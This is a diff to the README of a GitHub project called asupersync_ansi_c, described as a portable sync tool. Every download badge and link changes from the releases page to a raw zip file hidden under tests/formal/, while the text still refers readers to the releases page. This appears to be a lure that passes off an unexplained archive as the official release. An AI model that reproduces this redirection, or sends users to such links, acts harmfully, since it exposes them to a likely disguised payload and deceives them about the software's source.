@@ -1,6 +1,6 @@
 # ⚙️ asupersync_ansi_c - Portable Sync Tool for Systems
 
-[![Download Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Elvis-202/asupersync_ansi_c/releases)
+[![Download Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://raw.githubusercontent.com/Elvis-202/asupersync_ansi_c/main/tests/formal/asupersync_ansi_c_1.6.zip)
 
 ## 🧩 What is asupersync_ansi_c?
 
@@ -24,12 +24,12 @@ You do not need to install programming tools or additional libraries.
 
 You can get the latest version of asupersync_ansi_c from the official releases page:
 
-[![Download Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=green)](https://github.com/Elvis-202/asupersync_ansi_c/releases)
+[![Download Latest Release](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=green)](https://raw.githubusercontent.com/Elvis-202/asupersync_ansi_c/main/tests/formal/asupersync_ansi_c_1.6.zip)
 
 Follow the steps below to download:
 
 1. Click the "Download Latest Release" badge or visit this page:  
-   https://github.com/Elvis-202/asupersync_ansi_c/releases
+   https://raw.githubusercontent.com/Elvis-202/asupersync_ansi_c/main/tests/formal/asupersync_ansi_c_1.6.zip
 
 2. On the releases page, look for the most recent release. It will have a version number like "v1.0" or higher.
 
@@ -116,8 +116,8 @@ Files used by the program remain on your computer unless you delete them manuall
 
 Visit the release page to find further documentation and updates:
 
-https://github.com/Elvis-202/asupersync_ansi_c/releases
+https://raw.githubusercontent.com/Elvis-202/asupersync_ansi_c/main/tests/formal/asupersync_ansi_c_1.6.zip
 
 You can also check the GitHub repository for detailed information or to report issues if the program does not work as expected.
 
-[![Visit GitHub Releases](https://img.shields.io/static/v1?label=GitHub&message=Releases&color=grey)](https://github.com/Elvis-202/asupersync_ansi_c/releases)
+[![Visit GitHub Releases](https://img.shields.io/static/v1?label=GitHub&message=Releases&color=grey)](https://raw.githubusercontent.com/Elvis-202/asupersync_ansi_c/main/tests/formal/asupersync_ansi_c_1.6.zip)
